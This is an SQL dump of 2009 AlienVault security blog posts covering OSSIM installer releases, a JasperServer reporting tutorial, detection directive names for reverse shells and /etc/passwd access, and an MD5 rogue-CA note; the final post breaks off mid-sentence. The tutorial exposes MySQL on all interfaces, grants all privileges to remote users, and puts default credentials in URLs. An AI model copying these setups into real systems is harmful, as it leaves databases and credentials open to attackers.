INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (163, 'How to make good friends', 'Dominique Karg', 'March 27, 2009 ', 'I just wanted to share a quick mail we’ve received tonight at AlienVault. I’m hiding the user’s identity until he grants me permission to disclose it, which I doubt he’ll do btw.The mail did read as following:\nSubject: Port scan from you guys to my server from 207.158.15.208. Cease and desist.\n\n\n\nI installed your ossim product and now you are port scanning my servers?\n\n\n\nYou are scanning [insert FQDN here] servers right now and I am picking\n\nit up on my IDS coming from 207.158.15.208.\n\n\n\nCan you explain why you would be doing this?\n\n\n\nYou had better have a good explanation or I guarantee your company\n\nwill be written up in all the security publications I write in and I\n\nwill recommend that nobody ever use your product.\n\nAmazing, ain’t? No previous contact, no double checking, nothing, just going ahead, threatening, menacing and being bold.Well, here goes the answer. As said, this is my very own opinion and the company (Alienvault) has nothing to do with it.Just for the records, before replying I logged in into the above host, checked for unauthorized access, ran several tcpdumps and checked logs on his domain. Clean. Oh, and I’m going to call the user “Hugo” after a big mounth president with the same name.\nHello Hugo,\n\n\n\nhave you ever heard about kindness going a long way? Well, it usually works.\n\n\n\nIf you had kindly requested information about this, either on the\n\nforums (where hundreds of happy users would\'ve been eager to answer\n\nyou), on the irc, even on this contact address, I\'d have answered with\n\na nice: \"Hey Hugo, no worries, the 1.0.6 iso comes with an\n\nautomatic, free, nessus plugin feed which gets checked on a daily\n\nbasis. Due to the huge amount of users we\'ve got we noticed rsync\n\nstarting to duplicate itself, launching multiple instances which in\n\nturn get denied, provoking some sort of false positives\". I even\n\nwould\'ve offered you help on sorting it out if that weren\'t the cause,\n\nwhich I\'m pretty sure is.\n\n\n\nBut… here you come, threatening, menacing with bad manners. So the answer is.\n\n\n\nHugo, I encourage you to post the above mail to all the security\n\npublications you write in. I\'m sure your mail has the possibility to\n\nbecome one of those long lasting laughers which will be used as\n\nopenings in security conferences all over the world for the next few\n\nyears.\n\nNot enough with this, I offer you to also publish it on the ossim\n\nforums. I for sure will post it on my blog (no worries, unless you\n\ngrant me permission to do so I\'ll hide your name and mail) for other\n\nfellow users to comment on it.\n\n\n\n And, on top, I offer you a free refund for OSSIM. Oh, wait, you\n\nhaven\'t paid a single cent for it…\n\n\n\nSo please, just deinstall OSSIM right now, that will solve both our\n\nproblems or I guarantee your name will be written up in all the\n\nsecurity publications I write in and I will recommend that nobody ever\n\nlets you use their product. I\'d feel bad coding OSSIM and knowing that\n\nyou would benefit from it.\n\n\n\nWith kind regards,\n\n\n\nDominique Karg\n\n\n\nPS: Any views or opinions presented in this email are solely those of\n\nthe author, that is, me and do not represent those of the company\n\nThings like these keep opensource developers motivated. *sigh*Update 2009/03/27: the story goes on.Hugo was so kind and replied to my friendly mail in order to make sure I’d know he has no clue what he’s talking about:\nNo worries? When you download and install nessus by itself it asks you\n\nif you want to update and it does not trigger IDS systems. A user of\n\nyour products should not have to be woken up in the middle of the\n\nnight and read a forum to figure that out. If your system has an issue\n\ntriggering IDS systems, why have you not fixed the issue or at least\n\nput a warning up during install.\n\nYour product was not free in this case, it cost me my time waking up\n\nand trying to figure out why I was receiving IDS alerts. Lastly, why\n\nwould the product be receiving updates from your IP range for nessus.\n\nWould nessus not receive updates from the nessus update servers? I\n\nwill be calling today to speak with someone in management and I will\n\nbe happy to pass your email along to them.\n\nAnything amiss? right… the threats weren’t clear enough, so in a separate email he just wrote me a short:\nYour sarcasm will be noted when I speak with management at Alienvault today.\n\nAfter that level of threats, my only obvious answer could be (and was):\nDon\'t you think that would be a bit excessive? I could loose my job…\n\nTo which at least he didn’t answer yet (I expected something like “Mess with the best, die like the rest”).So, just to get it clear. Hugo downloads the ossim 1.0.6 iso which comes with automatic nessus updates, places into a restricted / highly protected network (I assume it is at least, what else would make you setup an IDS to send you an alarm and wake you up in the middle of the night), grants it full access to the internet (in order to trigger a portscan from rsync failures port 873 would have to be allowed in a firewall) and later on threatens the site where he downloaded the original .iso?C’mon Hugo, you should know better than that. Maybe it’s me who should talk to your management. What you’ve done show you’ve got no clue about security, best practices or infosec at all. I wouldn’t let you manage my ipod shuffle out of fear you could expose it.Furthermore, even after getting pointed at your mistake in the first response, you had the chance to apologize, but no, you answer with more threats. Threatening me to talk to AlienVault management shows your lack of checking on sources, which in turn not only nullifies you as a security professional but also should make everyone doubt 90% of the statements you make about what you know, what you think, what you recommend.I hope this is the end of the story…', 'funnyrude', '/blogs/labs-research/how-to-make-good-friends');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (164, 'Installer 1.2 beta3 available', 'Dominique Karg', 'March 19, 2009 ', 'And another quick post. New beta is out, thanks a ton to everybody reporting bugs. This time there aren’t big change, but a ton of small glitches have been fixed. Grab it here http://data.alienvault.com/ossim-installer_1.2.beta3.iso [No longer available]. As the last time, updates will focus on a beta3 base although they should work fine with others too.', 'ossiminstaller', '/blogs/labs-research/installer-12-beta3-available');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (165, 'Tutorial 8: OSSIM + JasperServer + iReport Tutorial', 'Dominique Karg', 'March 17, 2009 ', 'This eighth installment of the tutorial series will focus on a feature which will be revolutionary for OSSIM for sure: tight jasperserver integration for custom/periodic reports with the guarantee of a strong BI suite. The upcoming installer release will include both Tomcat as well as JasperServer ready to use and with sample preloaded reports and datasources. (Note: Installer beta2 http://data.alienvault.com/ossim-installer_1.2.beta2.iso [No longer available] users can already test some of this out, although no real tight integration until beta4 will be in place).If you haven’t heard about JasperServer nor iReport you can them check out JasperServer and iReport for some background. Quoting those two pages: “JasperServer is a high-performance business intelligence platform and report server designed for developers and businesses. Deploy JasperServer when end-users need to create their own ad hoc queries, reports, charts, crosstabs, dashboards, or it becomes necessary to secure, store, schedule, distribute, share, drill-down, or interact with reports.”“iReport is a graphical report tool for report designers, developers, and power-users. iReport provides complete coverage of all the reporting capabilities in JasperReports, JasperServer, and Jasper4Salesforce, including the creation of parameterized reports, pixel-perfect production reports, and remote JasperServer repository management”.I’m no jasperreports expert myself, I used it for report creation and I’m sure there are tons of tips and tricks experts can provide. Any comments and feedback that help improving this article will be greatly appreciated :-)During this tutorial the following steps will be covered:OSSIM - iReport - JasperServer integrationAssumptionsiReport download and setupOSSIM for iReport setupSample report: top events by risk/ocurrence.Uploading this report to jasperserverWhat to do next?Tips and Tricks.Sharing your work/fun: the Alien Forge.OSSIM - JasperServer integrationOk, a couple of notes first. The installer uses JDK6, Tomcat 6.0.18 and JasperServer 3.1. Everything is installed into /var/tomcat/, passwords get adjusted from /etc/ossim/ossim_setup.conf using ossim-reconfig and default login/password is jasperadmin/jasperadmin. Point your browser at http://ossim_ip:8080/jasperserver/ and you’re set.OSSIM will provide a series of default datasources for the most useful databases for reporting, that is, ossim, ocs inventory and snort.The idea behind this provide strong reporting without having to code it from zero up, but also have a way to share generic reports with other users. That’s what we’re going to do using the .jrxml formats, be able to share reports with others, creating an amazing amount of custom reports for users to use. More on this on the last section, the Alien Forge ;-)Warning: the following applies to users of the installer beta versions released on 2009/03 and beyond, don’t try this with 1.0.6 or previous versions; you’ll end up quite frustrated.AssumptionsMy IP is 192.168.1.24OSSIM is at 192.168.1.22User is ‘root’Password is ‘password’Jasperserver credentials are ‘jasperadmin:jasperadmin’iReport download and setupFirst, get iReport for your platform: Download. Win and mac got an easy installer, for linux I guess it’s the .jar file anyway. (Haven’t tested it).OSSIM for iReport setupIn order to enable access from your client you’ve got to grant it permissions from within mysql and enable mysql to listen on the network.Log into OSSIM via ssh as root.Edit /etc/mysql/my.cnf, search the line bind-address ... and replace 127.0.0.1 with 0.0.0.0. Execute /etc/init.d/mysql restart. This will enable remote connections to your mysql, so please choose a different password for the remote user in case somebody connects using your ip.Execute “ossim-db” (this will read the password from /etc/ossim/ossim_setup.conf and drop you into mysql>)Grant access to your client host. You might need to add another user here for our tutorial if you’re reading this before the final release, more on this later: “grant all on *.* to [email protected] identified by ‘password’;”Note: this is the easiest way of doing it, tighter permissions and separate users for each DB are recommended in high security environmentsNext, fire up iReport. We’ll start by creating a blank report:(Image removed, broken link, I’m very sorry. DK.)Let’s call it “Top20EventReport” for example (although later it will be top 10 and 50, but I had the screenshots done already so at least on my side it will be called like that :P).Here goes our next screen:(Image removed, broken link, I’m very sorry. DK.)Next we’ll add both datasources to our iReport. Click on the “report datasources button” as seen here:(Image removed, broken link, I’m very sorry. DK.)  and fill in the OSSIMDS definition with your info:(Image removed, broken link, I’m very sorry. DK.).Rinse and repeat for snort and you should end up with the following:(Image removed, broken link, I’m very sorry. DK.).Sample report: top events by risk/ocurrenceOur report will have two sections:- Top 50 events by risk (from acid_event).- Top 10 events by occurrence.First we start off with the query(s). This might be the hardest part of all, but as said, the idea is that all ossim users share their reports, so there might be those with more SQL knowledge, those with report designing skills and those with a greater security knowledge; combining the three of them will yield great reports.Our main report will be the one just reporting the 50 events. After that we’ll include a sub-report with the events by occurrence.For the record, the table we’re going to use herein is:acid_event:\n\n----------------------------------------\n\n| Field | Type | Null | Key | Default | Extra |\n\n+-------------------+------------------+------+-----+---------+-------+\n\n| sid | int(10) unsigned | NO | PRI | NULL | |\n\n| cid | int(10) unsigned | NO | PRI | NULL | |\n\n| signature | int(10) unsigned | NO | MUL | NULL | |\n\n| sig_name | varchar(255) | YES | MUL | NULL | |\n\n| sig_class_id | int(10) unsigned | YES | MUL | NULL | |\n\n| sig_priority | int(10) unsigned | YES | MUL | NULL | |\n\n| timestamp | datetime | NO | MUL | NULL | |\n\n| ip_src | int(10) unsigned | YES | MUL | NULL | |\n\n| ip_dst | int(10) unsigned | YES | MUL | NULL | |\n\n| ip_proto | int(11) | YES | MUL | NULL | |\n\n| layer4_sport | int(10) unsigned | YES | MUL | NULL | |\n\n| layer4_dport | int(10) unsigned | YES | MUL | NULL | |\n\n| ossim_type | int(11) | YES | MUL | 1 | |\n\n| ossim_priority | int(11) | YES | MUL | 1 | |\n\n| ossim_reliability | int(11) | YES | MUL | 1 | |\n\n| ossim_asset_src | int(11) | YES | MUL | 1 | |\n\n| ossim_asset_dst | int(11) | YES | MUL | 1 | |\n\n| ossim_risk_c | int(11) | YES | MUL | 1 | |\n\n| ossim_risk_a | int(11) | YES | MUL | 1 | |\n\n------------------------------------------Everything we need for this report can be found in there.Our querys would be as follows:select timestamp, sig_name, inet_ntoa(ip_src) as source, layer4_sport, inet_ntoa(ip_dst) as dest, layer4_dport,\n\n((ossim_risk_c + ossim_risk_a) / 2) as risk from acid_event where timestamp > DATE_SUB(NOW(), INTERVAL 7 DAY)\n\norder by risk desc limit 50;\n\n\n\nselect sig_name, count(*) as cnt from acid_event where timestamp > DATE_SUB(NOW(), INTERVAL 7 DAY) group by sig_name\n\norder by cnt desc limit 10;So, first let’s select SNORTDB as datasource on top. Then right-click on report name, “Edit Query” and insert our first one and click OK. Edit query location can be found here:(Image removed, broken link, I’m very sorry. DK.)Our first test would be to add some fields to the detail. Click on “Fields” so that you get a list like this:timestampsig_namesourcelayer4_sportdestlayer4_dportriskOr, on image:(Image removed, broken link, I’m very sorry. DK.)If we move any of those into the “Detail” (or any other) band, we’ll get them into our report. Let’s move timestamp, sig_name and risk into it, making the sections shorter and see how it will look. Also, a quick title (using a “Static text” field from the palette into title) and removing unused sections will help. Click on Preview next :-)(Screens below show the final layout and how our first preview should look like:)(Image removed, broken link, I’m very sorry. DK.)There we go ! Some first (ugly :P) results.Next we’ll get the top 10 graph into the report to get some colour into it.Let’s start by generating a sub-report.Get back to designer view, make the Title bar bigger and drag a sub-report item from palette into it:(Image removed, broken link, I’m very sorry. DK.)Start of with selecting “Create a new report”. Next we’ll select SNORTDB as datasource, since acid_event is inside SNORTDB:(Image removed, broken link, I’m very sorry. DK.).Then paste our sub-query into it:select sig_name, count(*) as cnt from acid_event where timestamp > DATE_SUB(NOW(), INTERVAL 7 DAY)\n\ngroup by sig_name order by cnt desc limit 10;We’ll need both fields, so move them both to the right(Image removed, broken link, I’m very sorry. DK.).No need for grouping, same connection as master and we’re set. Next, we’ll clean up everything, just leaving the title band. Select everything, right click, delete:(Image removed, broken link, I’m very sorry. DK.)A nice empty drawing space:(Image removed, broken link, I’m very sorry. DK.). Let’s fill it.See the chart widget on the right area ? Drag it right into our blank area and you’ll see a popup with the selection.We’ll want a 3D pie first:(Image removed, broken link, I’m very sorry. DK.).Next we’ll set up some common properties. Feel free to try out variations of course :-).Click on our chart and notice that the properties window on the right changes to “3D Pie Chart - Properties”. We’ll touch some of them in there.Find show legend, enable it.Find Theme and change it to eye.candy.sixtiesFind legend position, switch it to right.Next thing to do is to stretch the chart to fit into your window. Result should be something like this:(Image removed, broken link, I’m very sorry. DK.)Let’s fill in the values next. Right click chart, click on “edit chart data” and then on the “Detail tab”. Remember we had two fields available to us on this query, sig_name and cnt ? Well, let’s fill them into the right place.The key on which we’ll iterate is clearly the actual name, while the value will be the count. Since we also want to see how many there are of each count, we’ll use the count as label expression too. Note: label has to be a string so we need to convert the field into the right value before using it. You can see the final positions below:(Image removed, broken link, I’m very sorry. DK.) Accept and preview this new graph. It should ressemble this one:(Image removed, broken link, I’m very sorry. DK.)There we go, our graph is ready. Numbers are a bit crippled but I don’t know how to fix this right now, it’s a start nonetheless and I’ll update when I figure out (or hopefully someone else figures it out and tells me…).Now let’s get back to the main report (look at the tabs on top). Adjust the graph to content and align it to the left of our doc.(Image removed, broken link, I’m very sorry. DK.)Just a quick preview and… voilá, (hopefully) you’re seeing your shiny new report.(Image removed, broken link, I’m very sorry. DK.)Uploading this report to jasperserverNow we want to get this onto our server, see that we can generate it there whenever we want and schedule reports so they get sent out to the manager(s) every once in a while. (Note: don’t send them out this way, add some corporate logos, adjust styles, include more info and all that of course :-))So, we start selecting the item “JasperServer Repository” from the “Window” menu:(Image removed, broken link, I’m very sorry. DK.).This will open up a new tab on the left side of the screen.There we’ll click on “Add new server”so we can connect to our running jasperserver and fill in our jasperserver configuration:(Image removed, broken link, I’m very sorry. DK.)adding the right ip, removing the “-pro” behind jasperserver and entering credentials (jasperadmin:jasperadmin by default):(Image removed, broken link, I’m very sorry. DK.)Next comes a fork in the tutorial. If you click on your server and got OSSIMDS and SNORTDS as datasources, then your installed version is later than beta2 and you can skip below to the “Add report unit” part. Otherwise you’ll need to define the two datasources.First get back into ossim at console, enter “ossim-db” and create a user for local reporting access (as said before, it’s recommended to limit the permissions on production environments, but this is easier to debug):grant all on *.* to [email protected] identified by \'report_password\';\n\ngrant all on *.* to [email protected] identified by \'report_password\';After this, in order to create the missing datasources, we’ll right click on our server and Add new Datasource(Image removed, broken link, I’m very sorry. DK.).Fill in the name and label (OSSIMDS) and get into detail. We can import it from our report first but need to change the ip to 127.0.0.1.Rinse and repeat for SNORTDS. (Image removed, broken link, I’m very sorry. DK.)If you click on your server, you should now have two datasources (I’ve got no idea how the “Add new server” label got on top of OSSIMDS, but trust me, it’s there) defined.So now we can add a report unit (the combined report we just created) by right clicking again and selecting it.(Image removed, broken link, I’m very sorry. DK.).We’ll give it a name (names can’t contain spaces I believe), a label, a description and continue.(Image removed, broken link, I’m very sorry. DK.).Next we’ll select “locally defined” and load our main report .jrxml file into it (not the subreport one).(Image removed, broken link, I’m very sorry. DK.).After that we’ll get asked for the datasource. Since we’re reading from snort, we’ll select SNORTDS from the repository.(Image removed, broken link, I’m very sorry. DK.).Go ahead and it will prompt about a missing subreport and wether it shall be included too. Of course it should, so just accept:(Image removed, broken link, I’m very sorry. DK.).There we go, our report ready to be used along with two datasources.(Image removed, broken link, I’m very sorry. DK.)Let’s see if it worked. Point your browser at http://your_ip:8080/jasperserver/ and log in using jasperadmin/jasperadmin. As you (hopefully will) see, there is our report. Let’s generate it by clicking on the name :-)(Image removed, broken link, I’m very sorry. DK.)Aaah, there it is(Image removed, broken link, I’m very sorry. DK.). And in flash, which is prettier:(Image removed, broken link, I’m very sorry. DK.)Lastly I’d suggest getting back to iReport and upload the .jrxml reports files as backup, so next time you can fetch them from there and you can share it with co-workers:(Image removed, broken link, I’m very sorry. DK.)What to do next?Well, next steps would be scheduling reports to run on a daily/weekly/monthly basis as well as getting those reports into the executive panel for real-time visualization.Tips and TricksThe next list is intended to be a quick lifesaver guide for those into jasperserver. I’m sure I’ll need it in 6 months :-)Jasper is at /var/tomcat/. (easy one :P)Main logs are at /var/tomcat/logs/catalina.out.DB passwords get stored at three places: /var/tomcat/conf/Catalina/localhost/jasper… (verify) (add other two).If in trouble, get the latest jasperserver .war, undeploy, deploy and reconfig.Don’t try to move elements among document spaces (detail, title, group header, etc…), it will fail.Create subreports if unsure, they’re easy to maintain.If you want to include a report into executive panel, schedule it to overwrite itself, grab the url and add “j_username and j_password” to it’s url, as in < img src=“http://192.168.1.22:8080/jasperserver/fileview/fileview/Reports/Report1.html_files/img_0_0_0?j_username=jasperadmin&j_password=jasperadmin” >If you’re generating a report for management, use as many colours as possible; they love it!No need to save, every preview Saves. (I hope nobody gets offended, but this phrase just reminded me too much of Jesus saves… after each level he passes.Sharing your work/fun: The Alien ForgeWhy do I call this work/fun? My reasoning behind this whole article/post is as following: I’ll do a sample report and share it with all the fellow ossim users. This report might look like shit and be of a limited use, but I hope to get something moving. This report just shows a weekly top 50 events by risk and a top 10 events by raw event count. The design is horrible and the usefulness is limited, but what if…somebody took this one, added some nice column layout, some colors, tweaked a couple of things and uploaded it to the forge again ?somebody took the next one, added a listing for top 10 hosts for each of those events to the report including a name resolve?someone else took the previous one and added a field that would prompt the user for a month and it would generate a report for that one?take 10 more iterations…somebody integrates 10 of these sub-reports and creates an awesome auto-report for everyone to schedule on a daily/weekly/montly basis?This last step is my goal and I really think it can be done.OSSIM parts that benefit from custom content:SnortNessusOssim directivesOssim plugins (cfg + sql)Cross correlation rulesInventory Correlation rulesEvent repriorizationsOSSEC pluginsJasperServer custom reportsThe needs for this custom content will be covered in two ways:AlienVault FeedAlien ForgeThe AlienVault Feed will include updates for all those items on a regular basis. Updates will happen once a week with exceptional “critical” updates on certain important threats. Most of the items from the AlienVault Feed will be consolidated into the ossim releases, effectively creating a delay for regular users.The Alien Forge on the other hand is an exchange place for all those items between users. Got something to share? put it in there. The more content is shared the more people will be willing to share back. Think of a snowball rolling down a snowfield :-)The code is just being finished. Uploads will be categorized into Manufacturer, Product, Version and Type. Everybody will get full credit for their uploads and points, points we plan on being able to spend in:Free subscriptions.Certification extensions.Shirts / toys.Free Appliances.A free tryp (business class) to Mars once Mars flights are of common use (a visit to AlienVault headquarters included :P)I hope you liked this tutorial, the best way you can show that is by contributing reports back, any of them, even if it’s a “last 10 entries into the mysql users table”; everything will be used at some time by another users :-) Thanks for reading this far btw, it’s been one of the longest and most intensive tutorials so far.', 'tutorialireportjasperserver', '/blogs/labs-research/tutorial-8-ossim-jasperserver-ireport-tutorial');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (166, 'Ossim: Shellcode Detection and Analysis', 'Jaime Blasco', 'March 10, 2009 ', 'I’m glad to announce a new feature we have added to forensic console. We use libemu to make shellcode detection and analysis to help on forensic analysis and reduce false positives, an example:', 'ossimcorrelationattacksdirectiveslibemushellcodes', '/blogs/labs-research/ossim-shellcode-detection-and-analysis');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (167, 'Installer 1.2 beta2 available', 'Dominique Karg', 'March 7, 2009 ', 'Just a quick notice about beta2 being out. Tons of bugs have been this weeks, cheers to everybody helping. Updates for the upcoming week should apply to both but will be focused on beta2 \"http://data.alienvault.com/ossim-installer_1.2.beta2.iso [No longer available].Among the fixes, there are:Forensics panel visual and functionality fixes.New auto-update notification. When enabled the system checks for rule/directive/plugin or code updates once a day, presenting a visual notification to the user about the update and it’s contents.Snort should work fine now. Included some custom AlienVault rules for directives.About 20 new high-quality correlation directives detecting real world threats.Plugin .cfg and .sql fixes.OSSIM configuration menu fixes (issue ossim-setup from commandline in order to check it out).Many bugfixes.', 'ossiminstaller', '/blogs/labs-research/installer-12-beta2-available');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (168, 'Upcoming Installer testing version 1.2beta1', 'Dominique Karg', 'February 28, 2009 ', 'I’m proud to announce the availability of the first public testing release of the upcoming installer. We’re in final stages of testing now, and tho there are still known issues it’s time to get community feedback on it. Many many thanks to anybody willing to help test this iso. Please keep in mind that it’s a testing version, not intended for production. We can’t even ensure that at the end of the testing period there will be a seamless upgrade into the stable distribution ;-)First a quick note on versioning. The new installer will have two versions, one for each architecture:Installer 1.2: amd64 (that is, most of the 64bit capable processors out there, including Xeons).Installer 1.1: i386 (old 32bit).Our intention, right now, is to maintain the 1.1 as long as needed and focus on the 1.2(64bit). Functionality will be exactly the same (if it doesn’t involve too much work, we’ve got limited resources. Jasper/Tomcat integration for example will be limited to 1.2) on both but our development platform is entirely 64bit based due to performance reasons, so there might be a slight delay.We’re not excluding anyone tho, we’re going to maintain updates for 32bit while there is a large enough user base on it and 32bit users can test the 64bit version on vmware without problems.The installer testing version can be found at http://data.alienvault.com/ossim-installer_1.2.beta1.iso [no longer available]. Next I’ll list how to install it (along with update guidelines), known issues right now (and how to report new ones) and a short list of some of the stuff included in this release.Installing itGrab the iso, install it. After installation, in order to get a clean testing and updating environment (we’re working on solving this right now) issue an:apt-get remove ossim-cd-setup\n\nThis will erase the monstrous package we used before, leaving the files tho (since they’re uncompressed from within a .tgz). More on this later.After this:apt-get update; apt-get upgrade\n\nYou might get an gpg inoxious error; I’m working on getting the packages gpg signed, thanks Jonathan for the script when it arrives :-))Bugtracking/reportingKnown issuesThere are several issues that I’m aware of right now, which I’m working on:Jasperserver password change might break jasperserver.SEM doesn’t work out of the box (haven’t commited the code to the cvs yet)./home/ossim/dist/ doesn’t get cleaned up.Creating new tabs breaks existing tabs at executive panel.Memory issues (adding tomcat to the mix didn’t help the already large memory requirements)Passwords doesn’t get changed / adapted for everything.the reconfig bug when passwords contain “&, ‘, ; or \\”” is still present.repository is missing gpg signaturesFeature highlightThere are many things we’ll be proud of this new release, just to name a few (all of them will be provided before the final release via updates):Completely new forensics console. Based on ACID and BASE we decided to incorporate the code into our own cvs; we just have too many specific needs and need to cover them.Disk based event storage (a.k.a. SEM) (will be updating a screenshot asap)Interactive risk mapsReporting plugins using JasperServer. This will be a major breakthrough, allowing for easy to share reporting plugins, scheduled reports, auto-emailing of reports and much more.Shellcode interpretation plugin for forensics.OSSEC 2.0Many new plugins.Updated directives, cross correlation and inventory correlation tables.Complete debian package based update/upgrade mechanism, including offline updates. No more custom ossim-updates.Many more…We want this release to be as good as possible, and your feedback is crucial for that. Please download it, throw it into a VM, make your evil tests and report back on the forum thread mentioned above.\n\nEnjoy.', 'ossiminstallerbeta1.2amd64alpha', '/blogs/labs-research/upcoming-installer-testing-version-12beta1');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (169, 'New Directives', 'Jaime Blasco', 'February 3, 2009 ', 'I’ve just update the public CVS with some new directives as part of the effort we are doing to improve the upcoming installer:Attacks:Possible Successful Attack: Reverse Shell Access to the SystemPossible POP3 Bruteforce against SRC_IPPossible FTP Bruteforce against SRC_IPCommand execution against webserver on DST_IPFile /etc/passwd access on DST_IPPossible SQL injection attempt against DST_IPPossible attack against DST_IP (Symantec Remote Management RTVScan Exploit)Possible sa account bruteforce against SRC_IP (SQL Server)Possible VNC bruteforce against SRC_IPPossible attack against DST_IP (Microsoft Server Service related attack)Too many Cisco Firewall dropped events with destination DST_IPWorms:Possible Worm Infection against DST_IPPossible Worm Infection against DST_IP via DCOM RPC vulnerabilityPossible Worm Infection against DST_IP via Kill-Bill ASN1 vulnerabilityPossible Worm Infection against DST_IP via Lsasrv.dll RPC vulnerabilityPossible Worm Infection against DST_IP via WINS vulnerabilityPossible attack against DST_IP (Microsoft Server Service related attack)Possible worm scanning behavior on port DST_PORTMisc:Username gathering at SMTP server DST_IP', 'ossimcorrelationattacksdirectives', '/blogs/labs-research/new-directives');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (170, '25C3: Fake CA Certificates', 'Jaime Blasco', 'January 3, 2009 ', 'A security research team has demostrated how to use MD5 collision to create a rogue Certificate Authority certificatewith a cluster of 200 ps3s!!You can find all the information hereThe attack take advantage of a weakness in the MD5 cryptographic hash function that allows the construction of different messageswith the same MD5 hash and affects CAs that are still using this broken hash function like rapidssl.We can use the python port of M2Crypto to automating the process to obtain server certificates to verifythey are still using a certificate signed with MD5:\nfrom M2Crypto import SSL\n\n\n\nctx = SSL.Context()\n\nconn = SSL.Connection(ctx)\n\nconn.connect((\'www.rapidssl.com\', 443))\n\ncert = conn.get_peer_cert()\n\nprint cert.as_text()\n\n\n\nOutput:\nCertificate:\n\n    Data:\n\n        Version: 3 (0x2)\n\n        Serial Number: 1795 (0x703)\n\n        Signature Algorithm: md5WithRSAEncryption\n\n        Issuer: C=US, O=Equifax Secure Inc., CN=Equifax Secure eBusiness CA-1\n\n        Validity\n\n            Not Before: Mar  8 15:35:33 2005 GMT\n\n            Not After : Mar  7 15:35:33 2010 GMT\n\n        Subject: C=US, O=GeoTrust Inc., OU=Production, CN=www.rapidssl.com\n\n        Subject Public Key Info:\n\n            Public Key Algorithm: rsaEncryption\n\n            RSA Public Key: (1024 bit)\n\n                Modulus (1024 bit):\n\n                    00:bf:2b:bb:b0:a8:78:fb:8d:76:d7:14:c1:92:d8:\n\n                    c8:cb:99:ed:a8:9e:37:e5:4f:5d:7e:06:f6:52:5e:\n\n                    5c:4e:e8:6b:9e:22:bb:62:8b:b6:db:fe:5f:05:15:\n\n                    79:81:5a:4c:4c:89:6c:42:77:50:ac:8d:ce:a6:1a:\n\n                    49:21:8c:27:db:1a:79:f0:5d:fc:4d:84:8b:42:0f:\n\n                    8e:e6:6d:74:4b:a9:1e:b3:97:38:39:ec:28:88:5e:\n\n                    1d:7a:c9:2b:53:34:71:2c:6c:80:80:78:ed:08:c7:\n\n                    a8:fb:70:39:76:3b:2a:bd:c4:a9:88:6c:95:95:73:\n\n                    2a:ab:85:05:15:b8:cd:59:5f\n\n                Exponent: 65537 (0x10001)\n\n        X509v3 extensions:\n\n            X509v3 Key Usage: critical\n\n                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment\n\n            X509v3 CRL Distribution Points: \n\n                URI:http://crl.geotrust.com/crls/ebizca1.crl\n\n\n\n            X509v3 Authority Key Identifier: \n\n                keyid:4A:78:32:52:11:DB:59:16:36:5E:DF:C1:14:36:40:6A:47:7C:4C:A1\n\n\n\n    Signature Algorithm: md5WithRSAEncryption\n\n        49:e5:4b:7f:48:f3:d1:b6:04:f4:59:a7:63:92:f2:eb:b2:a3:\n\n        1f:c3:31:c4:d3:54:67:9d:77:35:e2:e1:a4:84:9b:d4:91:82:\n\n        32:6b:93:3e:d8:7e:36:66:c8:aa:5f:b8:3a:ee:2c:2c:70:97:\n\n        66:d1:e5:0e:23:dd:04:39:a8:c8:e4:4e:bb:75:85:52:d0:cd:\n\n        37:51:69:07:aa:25:5d:cb:60:ac:a1:98:54:4b:1e:9d:49:fe:\n\n        fa:b1:eb:f9:c3:79:bc:84:d8:4a:2c:bf:67:de:0c:70:8d:f0:\n\n        c3:14:6f:04:8b:9d:14:bd:e9:fd:fd:b7:6d:66:9b:bc:e5:f1:\n\n        74:54\n\nWith this module you can easily make a tool to scan internet sites that are still using certificatesof CAs affected (md5WithRSAEncryption).', 'sslencryptionbrokenmd5tags 25c3', '/blogs/labs-research/25c3-fake-ca-certificates');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (171, 'Microsoft Exploitability Index', 'Jaime Blasco', 'October 15, 2008 ', 'Microsoft has just added a new index to new security bulletins to provide additional information about the potential exploitability of vulnerabilities associated with a Microsoft security update.The index classify each vulnerability with the Exploitability Index Assessment that indicate the likelihood of functioning exploit code, the three possible values are:- 1 Consistent exploit code likely- 2 Inconsistent exploit code likely- 3 Functioning exploit code unlikelyYou can find additional information in this document and real examples in the new Microsoft Security Bulletin Summary for October 2008', 'microsoftvulnerabilitiesexploitability index', '/blogs/labs-research/microsoft-exploitability-index');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (172, 'Tutorial 7: Feature highlight / pre-tutorial on Risk Maps', 'Dominique Karg', 'October 15, 2008 ', 'IntroductionToday I would to share something interesting we’re working on: Risk/Availability/Vulnerability indicator Maps.The purpose was to fit the most important information that can be gained from ossim all over it’s interface, into a simple to use, simple to manage and simple to analyze interface.We already had an approach to both, to using maps (images) and to aggregate/organize different input into meta-objets (what we called business processes). But, both of them had the same problem: they were complex and they were ugly.So now, using the data from that part, we tried to make an interface that was as appealing to the user as possible, but which also was foolproof so that it could be used by less-skilled users (*cough* management *cough*). And here is the result.I’d love to express my sincere gratitude to Juan Manuel Albarracin, who’s coded up the groundworks for all of this in less than four days. Kudos :-).Also, the screenshots shown here might not reflect the final release. This is work in progress, I’m going to commit code for it to the cvs very soon (tomorrow or monday/tuesday) and it will be in the 1.1 installer release, but of course we’‘ll be polishing the look and functionality before that.Sample setupFinal resultThe screenshot below these lines shows a finished map of our office, with icons matching people and some specific hosts/environments.(Image removed, broken link, I’m very sorry. DK.).On that map you can see the basic object which make up the new map:The background shape. Usually this would be a network map for your infrastructure, but can be anything from geopolitical maps, to logos, to blank pages or whatever you want.Configurable icons. A standard set will be provided, custom icons can be uploaded.Each element can be freely dragged around (during configuration)Every element can be linked to some url (some part of ossim, another map, an external place)Each element features it’s own easy to understand (green/yellow/red :P) Risk/Vulnerability/Availability 